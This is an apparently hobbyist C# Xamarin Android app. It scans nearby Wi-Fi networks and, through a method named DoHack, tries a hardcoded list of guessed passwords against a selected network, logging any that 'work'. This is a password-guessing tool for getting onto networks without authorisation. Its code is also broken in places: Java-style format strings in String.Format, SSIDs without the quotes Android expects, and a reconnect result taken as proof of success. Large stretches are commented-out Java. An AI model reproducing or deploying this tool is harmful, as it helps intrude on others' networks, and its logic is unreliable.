using Android.App;
using Android.Widget;
using Android.OS;
using Android.Net.Wifi;
using Android.Runtime;
using System.Linq;
using System.Collections.Generic;
using Android.Content;
using System;

namespace Try2
{
    [Activity(Label = "Try2", MainLauncher = true, Icon = "@mipmap/icon")]
    public class MainActivity : Activity
    {
        int count = 1;
        string zSelWifi = "";
        List<string> zPW = new List<string>() { "aaaaaaaa", "bbbbbbbb", "aaaabbbb" };

        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);

            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.Main);

            // Get our button from the layout resource,
            // and attach an event to it
            Button button = FindViewById<Button>(Resource.Id.myButton);

            button.Click += delegate { GetWifi(); };

            Button btnCon = FindViewById<Button>(Resource.Id.btnConnect);

            btnCon.Click += delegate { DoHack(); };


            Button x = FindViewById<Button>(Resource.Id.btnTest);

            x.Click += delegate { SetSsidAndPassword(null, "TestDLink", "aaaaaaaa"); };
            //            button.Click += delegate { button.Text = ConnectToWifi(); };
            //button.Click += delegate { ConnectToWifi(); };
        }

        private void DoHack()
        {
            try
            {

                DoLog("STARTING");

                foreach (var xItem in zPW)
                {

                    if (ConnectToWifi(zSelWifi, xItem))
                    {
                        DoLog("WORKED : |" + zSelWifi + "|" + xItem);
                    }

                }

                DoLog("DONE");

            }
            catch
            {

            }
        }

            private void GetWifi()
        {

            LinearLayout layout = FindViewById<LinearLayout>(Resource.Id.myMain);


            // Create Radio Group
            var rg = new RadioGroup(this);

            // Add Radio Buttons to Radio Group

            var xWifi = new List<string>();
            xWifi = GetWifiList();

            foreach (var aItem in xWifi)
            {
                var rb = new RadioButton(this) { Text = aItem };
               // rb.CheckedChange += delegate { Rb_CheckedChange };
                rg.AddView(rb);
            }


            /*
                        for (int i = 1; i < 6; i++)
                        {
                            var rb = new RadioButton(this) { Text = $"Radio Button {i}" };
                            rg.AddView(rb);
                        }
            */
            try
            {
                layout.RemoveView(FindViewById<RadioGroup>(Resource.Id.rgMain));
                layout.RemoveView(FindViewById<TextView>(123455));
            }
            catch
            {

            }

            rg.Id = Resource.Id.rgMain;

            //            rg.CheckedChange += delegate { Rg_CheckedChange };
            rg.CheckedChange +=  Rg_CheckedChange;


            layout.AddView(rg);


            var lblOutput = new TextView(this);
            lblOutput.Id = 123455;
            layout.AddView(lblOutput);
            // x = rg;
            /*
            // Show Radio Button Selected
            lblOutput = new TextView(this);
            layout.AddView(lblOutput);
            rg.CheckedChange += (s, e) => {
                lblOutput.Text = $"Radio Button {e.CheckedId} Selected";
            };
            RadioGroup radioGroup = FindViewById<RadioGroup>(Resource.Id.rgMain);
            */


        }

        private void DoLog(string xMessage)
        {
            try
            {
                var x = FindViewById<TextView>(123455);
                x.Text += xMessage + '\n' ;
            }
            catch
            {

            }
        }

        private void Rg_CheckedChange(object sender, RadioGroup.CheckedChangeEventArgs e)
        {
            try
            {
                
                var y = FindViewById<RadioButton>(e.CheckedId);

                DoLog("Selected " + y.Text);
                

                zSelWifi = y.Text;
            }
            catch
            {

            }
        }

        private void Rb_CheckedChange(object sender, CompoundButton.CheckedChangeEventArgs e)
        {



        }

        public bool SetSsidAndPassword(Context context, string ssid, string key)
        {
            try
            {
                EditText xedtss = FindViewById<EditText>(Resource.Id.edtss);
                var xss = xedtss.Text;

                EditText xedtpw = FindViewById<EditText>(Resource.Id.edtpw);
                var xpw = xedtpw.Text;

                ssid = xss;
                key = xpw;
                DoLog("SetSsidAndPassword: " + ssid + "|" + key);

                WifiConfiguration wifiConfig = new WifiConfiguration();
                wifiConfig.Ssid = String.Format("\"%s\"", ssid);
                wifiConfig.PreSharedKey = String.Format("\"%s\"", key);

                WifiManager wifiManager = GetSystemService(WifiService).JavaCast<WifiManager>(); //GetSystemService(Context.WifiService);
                int networkId = wifiManager.ConnectionInfo.NetworkId;
                wifiManager.RemoveNetwork(networkId);
                wifiManager.SaveConfiguration();
                //remember id
                int netId = wifiManager.AddNetwork(wifiConfig);
                wifiManager.Disconnect();
                wifiManager.EnableNetwork(netId, true);
                wifiManager.Reconnect();

                return true;
            }
            catch (Exception e)
            {
                DoLog(e.Message);
                return false;
            }
        }
        private List<string> GetWifiList()
        {


            var wifiManager = GetSystemService(WifiService).JavaCast<WifiManager>();



            wifiManager.StartScan();
            var x = new List<string>();
            foreach (var aItem in wifiManager.ScanResults)
            {
                x.Add(aItem.Ssid);
            }

            return x;
        }


        private bool ConnectToWifi(string xSsid, string xPassword)
        {

            DoLog("Trying : " + xSsid + "," + xPassword);
            /*
            WifiConfiguration wifiConfig = new WifiConfiguration();
            wifiConfig.Ssid = xSsid;
            wifiConfig.StatusField = WifiConfiguration.Status.Disabled;
            wifiConfig.Priority = 40;

            // Dependent on the security type of the selected network
            // we set the security settings for the configuration
            if (/*Open network)
            {
                // No security
                wifiConfig.AllowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
                wifiConfig.allowedAuthAlgorithms.clear();
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
            }
            else if (/*WPA || /*WPA2)
            {
                //WPA/WPA2 Security
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
                wifiConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
                wifiConfig.preSharedKey = "\"".concat(password).concat("\"");
            }
            else if (/*WEP)
            {
                // WEP Security
                wifiConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.None);
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
                wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
                wifiConfig.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN);
                wifiConfig.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.SHARED);
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
                wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
                wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);

                if (getHexKey(password)) wifiConfig.wepKeys[0] = password;
                else wifiConfig.wepKeys[0] = "\"".concat(password).concat("\"");
                wifiConfig.wepTxKeyIndex = 0;
            }

            // Finally we add the new configuration to the managed list of networks
            int networkID = wifiMan.addNetwork(wifiConfig);*/





            var wifiConfig = new WifiConfiguration
            {
                Ssid = xSsid,
                PreSharedKey = xPassword
            };

            var wifiManager = GetSystemService(WifiService).JavaCast<WifiManager>();

            DoLog( wifiManager.ConfiguredNetworks.Count.ToString());

            var addNetwork = wifiManager.AddNetwork(wifiConfig);
            DoLog("addNetwork = " + addNetwork);

            foreach (var xItem in wifiManager.ConfiguredNetworks)
            {
                if (xItem.Ssid == ("\"" + (xSsid) + "\"") )
                {
                    DoLog("Found = " + addNetwork);
                    wifiManager.Disconnect();

                    var enableNetwork = wifiManager.EnableNetwork(xItem.NetworkId, true);

                    DoLog("Enable = " + enableNetwork.ToString());

                    if (wifiManager.Reconnect())
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else
                {

                }
                DoLog(xItem.Ssid.ToString() + "|" + xItem.PreSharedKey);
            }

            return false;

            /*
            var network = wifiManager.ConfiguredNetworks.FirstOrDefault((n) => n.Ssid == xSsid);
            if (network == null)
            {
                DoLog("Didn't find the network, not connecting.");
                return false;
            }


            wifiManager.Disconnect();

            var enableNetwork = wifiManager.EnableNetwork(network.NetworkId, true);

            //System.Diagnostics.Debug.WriteLine("enableNetwork = " + enableNetwork);

            if (wifiManager.Reconnect())
            {
                return true;
            }
            else
            {
                return false;
            }


/*
            wifiManager.StartScan();

            return wifiManager.ScanResults.FirstOrDefault().Ssid;

            //System.Diagnostics.Debug.WriteLine(
            //wifiManager.ScanResults.ToString());
            /*

            var addNetwork = wifiManager.AddNetwork(wifiConfig);
            System.Diagnostics.Debug.WriteLine("addNetwork = " + addNetwork);

            var network = wifiManager.ConfiguredNetworks.FirstOrDefault((n) => n.Ssid == ssid);
            if (network == null)
            {
                System.Diagnostics.Debug.WriteLine("Didn't find the network, not connecting.");
                return;
            }


            wifiManager.Disconnect();

            var enableNetwork = wifiManager.EnableNetwork(network.NetworkId, true);
            System.Diagnostics.Debug.WriteLine("enableNetwork = " + enableNetwork);

            if (wifiManager.Reconnect())
            {
                var builder = new AlertDialog.Builder(this);
                builder.SetMessage("Connected");
                var alert = builder.Create();
                alert.Show();
            }
            else
            {
                var builder = new AlertDialog.Builder(this);
                builder.SetMessage("Nope");
                var alert = builder.Create();
                alert.Show();
            }
            */
        }
    }
}

